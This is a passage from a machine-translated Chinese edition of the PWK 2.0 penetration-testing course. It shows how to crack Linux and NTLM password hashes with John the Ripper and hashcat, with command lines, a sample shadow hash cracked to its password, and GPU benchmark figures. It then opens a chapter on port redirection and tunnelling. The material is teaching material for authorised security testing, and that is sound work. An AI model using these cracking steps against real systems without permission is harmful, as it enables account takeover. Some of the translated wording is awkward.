<div style="position:absolute;top:179970;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --forma</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:179987;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">t=NT</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:180007;left:306"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 621 - 使用密码变异规则破解</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:180036;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了使用 JTR 破解基于 Linux 的哈希，我们需要首先使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">unshadow</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实用程序来</font></font></nobr></div>
<div style="position:absolute;top:180055;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">合并来自受感染系统的 passwd 和 shadow 文件。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:180090;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">unshadow passwd-file.txt shadow-file.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:180107;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">受害者：$6$fOS.xfbT$5c5vh3Zrk.88SbCWP1nrjgccgYvCC/x7SEcjSujtrvQfkO4pSWHaGxZojNy.vAqMGrB</font></font></nobr></div>
<div style="position:absolute;top:180124;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BNOb0P3pW1ybxm2OIT/:1003:1003:,,,:/home/victim:/bin/bash</font></font></nobr></div>
<div style="position:absolute;top:180158;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">unshadow passwd-file.txt shadow-file.txt &gt; unshadowed.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:180177;left:296"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 622 - 准备用于破解的 Linux 密码哈希</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:180207;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们现在可以运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">john</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，将 wordlist 和 unshadowed 文本文件作为参数传递：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:180242;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:180259;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用默认输入编码：UTF-8</font></font></nobr></div>
<div style="position:absolute;top:180276;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">加载 1 个密码哈希（sha512crypt，crypt(3) $6$ [SHA512 256/256 AVX2 4x]）</font></font></nobr></div>
<div style="position:absolute;top:180293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于所有加载的哈希，成本 1（迭代次数）为 5000</font></font></nobr></div>
<div style="position:absolute;top:180310;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将运行 2 个 OpenMP 线程</font></font></nobr></div>
<div style="position:absolute;top:180327;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">按 'q' 或 Ctrl-C 中止，几乎任何其他状态键</font></font></nobr></div>
<div style="position:absolute;top:180343;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s3cr3t    </font></font></nobr></div>
<div style="position:absolute;top:180343;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（受害者）</font></font></nobr></div>
<div style="position:absolute;top:180360;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1g 0:00:00:28 完成 (2019-08-20 15:42) 0.03559g/s 2497p/s 2497c/s 2497C/s </font></font></nobr></div>
<div style="position:absolute;top:180378;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:180397;left:265"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 623 - 使用 John the Ripper 破解 Linux 密码哈希</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:180426;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">新版本的开膛手约翰默认是多线程的，但旧版本只使用一个</font></font></nobr></div>
<div style="position:absolute;top:180446;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CPU 内核执行破解操作。</font><font style="vertical-align: inherit;">如果您遇到旧版本的 JTR，它支持</font></font></nobr></div>
<div style="position:absolute;top:180465;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以加快进程的替代方案。</font><font style="vertical-align: inherit;">我们可以使用多个 CPU 内核，甚至多个</font></font></nobr></div>
<div style="position:absolute;top:180484;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">计算机，以分配负载并加快破解过程。</font><font style="vertical-align: inherit;">该</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--fork</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项啮合</font></font></nobr></div>
<div style="position:absolute;top:180504;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">多个进程在一台机器上使用更多的 CPU 内核，并且</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--node</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">拆分工作</font></font></nobr></div>
<div style="position:absolute;top:180523;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">跨多台机器。</font></font></nobr></div>
<div style="position:absolute;top:180556;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，假设我们有两台机器，每台机器都有一个 8 核 CPU。</font><font style="vertical-align: inherit;">在第一台机器上</font></font></nobr></div>
<div style="position:absolute;top:180575;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将设置</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--fork=8</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--node=1-8/16</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项，指示约翰创建八个</font></font></nobr></div>
<div style="position:absolute;top:180595;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这台机器上处理，将提供的词表分成十六等份，并处理第一个</font></font></nobr></div>
<div style="position:absolute;top:180614;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本地八部分。</font><font style="vertical-align: inherit;">在第二台机器上，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--fork=8</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--node=9-16</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来分配</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:180751;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="153"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 153 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:180784;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:181861;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:181861;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:181861;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">594</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:180880;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">八个过程到词表的后半部分。</font><font style="vertical-align: inherit;">以这种方式划分工作将提供</font></font></nobr></div>
<div style="position:absolute;top:180899;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">大约 16 倍的性能提升。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:180961;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击者还可以预先计算密码的哈希值（这可能需要花费大量时间）</font></font></i></nobr></div>
<div style="position:absolute;top:180981;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">处理的时间），并将它们存储在一个庞大的数据库，或者彩虹表，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">585</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，使</font></font></i></nobr></div>
<div style="position:absolute;top:181000;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码破解一个简单的查表事件。</font><font style="vertical-align: inherit;">这是一个时空权衡</font></font></i></nobr></div>
<div style="position:absolute;top:181019;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因为这些表会消耗大量的空间（进入</font></font></i></nobr></div>
<div style="position:absolute;top:181039;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PB 取决于密码的复杂性），但密码“破解”</font></font></i></nobr></div>
<div style="position:absolute;top:181058;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">过程本身（技术上是一个查找过程）花费的时间要少得多。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:181120;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然 John the Ripper 是破解密码哈希的好工具，但它的速度受限于功率</font></font></nobr></div>
<div style="position:absolute;top:181139;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">专用于该任务的 CPU 数量。</font><font style="vertical-align: inherit;">近年来，图形处理单元 (GPU) 已成为</font></font></nobr></div>
<div style="position:absolute;top:181158;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">非常强大，当然，在每台带显示器的计算机中都能找到。</font><font style="vertical-align: inherit;">高端机器，</font></font></nobr></div>
<div style="position:absolute;top:181178;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">就像用于视频编辑和游戏的那些一样，配备了非常强大的 GPU。</font><font style="vertical-align: inherit;">GPU破解</font></font></nobr></div>
<div style="position:absolute;top:181197;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Hashcat </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">586</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">等工具</font><font style="vertical-align: inherit;">利用 CPU 和 GPU 的强大功能来获取令人难以置信的密码</font></font></nobr></div>
<div style="position:absolute;top:181217;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开裂速度。</font></font></nobr></div>
<div style="position:absolute;top:181250;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Hashcat 的选项通常反映开膛手约翰的选项，并包括算法等功能</font></font></nobr></div>
<div style="position:absolute;top:181269;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检测和密码列表突变。</font></font></nobr></div>
<div style="position:absolute;top:181302;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在此示例中，我们将在</font><font style="vertical-align: inherit;">配备 GeForce GTX 的机器上</font><font style="vertical-align: inherit;">以基准测试模式 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-b</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font><font style="vertical-align: inherit;">运行 hashcat</font></font></nobr></div>
<div style="position:absolute;top:181321;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1080 钛 GPU：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:181356;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\Cracker\hashcat-4.2.1&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hashcat64.exe -b</font></font></font></b></nobr></div>
<div style="position:absolute;top:181373;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hashcat (v4.2.1) 在基准模式下启动...</font></font></nobr></div>
<div style="position:absolute;top:181390;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:181407;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OpenCL 平台 #1：NVIDIA 公司</font></font></nobr></div>
<div style="position:absolute;top:181424;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">======================================</font></font></nobr></div>
<div style="position:absolute;top:181441;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 设备 #1：GeForce GTX 1080 Ti，2816/11264 MB 可分配，28MCU</font></font></nobr></div>
<div style="position:absolute;top:181475;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基准相关选项：</font></font></nobr></div>
<div style="position:absolute;top:181492;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">============================</font></font></nobr></div>
<div style="position:absolute;top:181509;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* --optimized-kernel-enable</font></font></nobr></div>
<div style="position:absolute;top:181543;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">哈希模式：0 - MD5</font></font></nobr></div>
<div style="position:absolute;top:181576;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Speed.Dev.#1.....: </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">39354.5 MH/s</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (93.70ms) @ Accel:128 Loops:1024 Thr:1024 Vec</font></font></nobr></div>
<div style="position:absolute;top:181610;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">哈希模式：100 - SHA1</font></font></nobr></div>
<div style="position:absolute;top:181645;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Speed.Dev.#1.....: </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13251.8 MH/s</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (87.49ms) @ Accel:128 Loops:512 Thr:640 Vec:1</font></font></nobr></div>
<div style="position:absolute;top:181678;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">哈希模式：1400 - SHA-256</font></font></nobr></div>
<div style="position:absolute;top:181712;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Speed.Dev.#1.....:   </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4770.8 MH/s</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (48.15ms) @ Accel:128 Loops:64 Thr:1024 Vec:1</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:181791;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">585 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Rainbow_table</font></font></font></nobr></div>
<div style="position:absolute;top:181811;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">586 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Hashcat, 2018), https://hashcat.net/hashcat/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:181939;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="154"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 154 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:181972;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:183049;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:183049;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:183049;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">595</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:182068;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">哈希模式：1700 - SHA-512</font></font></nobr></div>
<div style="position:absolute;top:182101;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Speed.Dev.#1.....:   </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1567.9 MH/s</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (92.38ms) @ Accel:128 Loops:64 Thr:640 Vec:1</font></font></nobr></div>
<div style="position:absolute;top:182136;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">哈希模式：1000 - NTLM</font></font></nobr></div>
<div style="position:absolute;top:182169;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Speed.Dev.#1.....: </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">65267.0 MH/s</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (55.66ms) @ Accel:128 Loops:1024 Thr:1024 Vec</font></font></nobr></div>
<div style="position:absolute;top:182203;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">哈希模式：5500 - NetNTLMv1 / NetNTLMv1+ESS</font></font></nobr></div>
<div style="position:absolute;top:182237;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Speed.Dev.#1.....: </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">33504.0 MH/s</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (55.00ms) @ Accel:128 Loops:512 Thr:1024 Vec:</font></font></nobr></div>
<div style="position:absolute;top:182271;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">哈希模式：5600 - NetNTLMv2</font></font></nobr></div>
<div style="position:absolute;top:182305;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Speed.Dev.#1.....:   </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2761.2 MH/s</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (83.59ms) @ Accel:128 Loops:64 Thr:1024 Vec:1</font></font></nobr></div>
<div style="position:absolute;top:182339;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">哈希模式：1800 - sha512crypt $6$，SHA512 (Unix)（迭代次数：5000）</font></font></nobr></div>
<div style="position:absolute;top:182373;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Speed.Dev.#1.....:    </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">218.6 kH/s</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (51.55ms) @ Accel:512 Loops:128 Thr:32 Vec:1</font></font></nobr></div>
<div style="position:absolute;top:182390;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">....</font></font></nobr></div>
<div style="position:absolute;top:182409;left:264"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 624 - GeForce GTX 1080 Ti 的基准破解速度</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:182439;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基准数据非常令人难以置信，显示每个 SHA1 的哈希速度超过 130 亿</font></font></nobr></div>
<div style="position:absolute;top:182458;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其次，NTLM 速度超过每秒 620 亿个哈希，甚至是非常复杂和缓慢的</font></font></nobr></div>
<div style="position:absolute;top:182477;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sha512crypt 哈希算法以惊人的每秒 200,000 个哈希运行。</font><font style="vertical-align: inherit;">将此与</font></font></nobr></div>
<div style="position:absolute;top:182497;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们之前在我们的（公认的蹩脚）Kali VM CPU 上运行的 John the Ripper</font></font></nobr></div>
<div style="position:absolute;top:182516;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以每秒数百个哈希的速度前进。</font></font></nobr></div>
<div style="position:absolute;top:182549;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些速度是通过单个 GPU 实现的，但多 GPU 计算机有四个，</font></font></nobr></div>
<div style="position:absolute;top:182568;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">八个或更多 GPU。</font><font style="vertical-align: inherit;">在本文出版时，一台具有单 GPU 的破解计算机可以</font></font></nobr></div>
<div style="position:absolute;top:182588;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">构建成本约为 2000 美元，而四核 GPU 设备的价格约为 6000 美元。</font><font style="vertical-align: inherit;">八-</font></font></nobr></div>
<div style="position:absolute;top:182607;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GPU 系统已经注册了每秒超过 5000 亿个 NTLM 哈希的基准！</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">587</font></font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:182641;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.4.3.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:182676;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（此练习不需要报告）</font></font></i></nobr></div>
<div style="position:absolute;top:182709;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.从你的Windows机器为转储的NTLM哈希创建一个wordlist文件并破解</font></font></nobr></div>
<div style="position:absolute;top:182728;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用开膛手约翰散列。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:182765;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.5 总结</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:182807;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有很多可用的密码攻击工具和词表，以至于人们很想</font></font></nobr></div>
<div style="position:absolute;top:182826;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在渗透测试中跳入并开火以寻找通常难以捉摸的突破。</font><font style="vertical-align: inherit;">然而，</font></font></nobr></div>
<div style="position:absolute;top:182846;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成功不仅在于深入了解每个工具的用法和优势，还在于学习</font></font></nobr></div>
<div style="position:absolute;top:182865;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">退后一步，以智慧应用这些工具，尊重速度和精确度的平衡，就像</font></font></nobr></div>
<div style="position:absolute;top:182884;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并优先考虑客户生产环境的安全。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:182999;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">587 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(epixoip, 2019), https://gist.github.com/epixoip/ace60d09981be09544fdd35005051505</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:183127;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="155"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 155 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:183160;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:184237;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:184237;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:184237;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">596</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:183250;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.5.1.1.1</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:25px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:183276;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20. 端口重定向和隧道</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:183320;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块中，我们将演示各种形式的端口重定向、隧道和流量</font></font></nobr></div>
<div style="position:absolute;top:183340;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">封装。</font><font style="vertical-align: inherit;">了解和掌握这些技术将为我们提供外科手术</font></font></nobr></div>
<div style="position:absolute;top:183359;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操纵目标流量的定向流所需的工具，这通常在以下情况下很有用</font></font></nobr></div>
<div style="position:absolute;top:183378;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">受限的网络环境。</font><font style="vertical-align: inherit;">然而，这将需要极度专注，因为这个模块</font></font></nobr></div>
<div style="position:absolute;top:183398;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不可否认，这有点令人费解。</font></font></nobr></div>
<div style="position:absolute;top:183430;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对协议进行</font><font style="vertical-align: inherit;">隧道</font><font style="vertical-align: inherit;">传输</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">588</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">涉及将其封装在不同的协议中。</font><font style="vertical-align: inherit;">通过使用各种</font></font></nobr></div>
<div style="position:absolute;top:183450;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">隧道技术，我们可以通过不兼容的传输网络承载给定的协议，或者</font></font></nobr></div>
